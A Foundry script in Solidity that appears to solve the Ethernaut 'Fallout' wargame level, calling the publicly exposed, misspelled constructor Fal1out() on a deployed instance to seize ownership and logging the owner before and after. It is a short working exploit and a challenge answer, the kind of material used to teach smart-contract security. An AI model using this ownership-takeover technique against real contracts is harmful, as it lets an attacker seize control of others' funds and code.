// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Fallout} from "../src/02-Fallout.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(payable(0xa0D0f2E058df4C4a028DD6738D4353c9B1E455f5));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Old Owner: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("New Owner: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}